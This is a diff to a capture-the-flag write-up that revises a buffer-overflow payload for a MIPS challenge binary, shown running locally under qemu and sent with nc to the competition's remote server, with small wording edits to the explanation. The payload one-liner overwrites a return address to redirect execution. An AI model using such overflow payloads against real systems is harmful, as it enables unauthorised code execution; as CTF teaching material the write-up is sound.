@@ -236,16 +236,17 @@ order), high byte of which we may not send, `scanf()` will write it
 for us as NULL-terminator.
 Try it:
 
-    $ python -c "print(('A'*260) + ('A'*4 + '\x58\x08\x40\x00'*4))" | qemu-mipsel ./bof
+    $ python -c "print('A'*260 + 'A'*4 + '\x58\x08\x40')" | qemu-mipsel ./bof
     Cauliflower systems never crash >>
     could not open flag
     $ 
 
-See, no segmentation fault, the program thinks that everything is Ok.
-And there is message that it tries but could not open a flag tells us 
-that we are on the right way. Check it with remote server:
+Notice that there is no segmentation fault, the program thinks that 
+everything is Ok. And there is message that it tries but could not open 
+a flag tells us that we are on the right way. Check it with remote 
+server:
 
-    $ python -c "print('run\n'+('A'*260) + ('A'*4 + '\x58\x08\x40\x00'*4))" | nc buffer-overflow.ctfcompetition.com 1337
+    $ python -c "print('run\n' + 'A'*260 + 'A'*4 + '\x58\x08\x40')" | nc buffer-overflow.ctfcompetition.com 1337
     Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
      Bonus flag for controlling the crash.
 
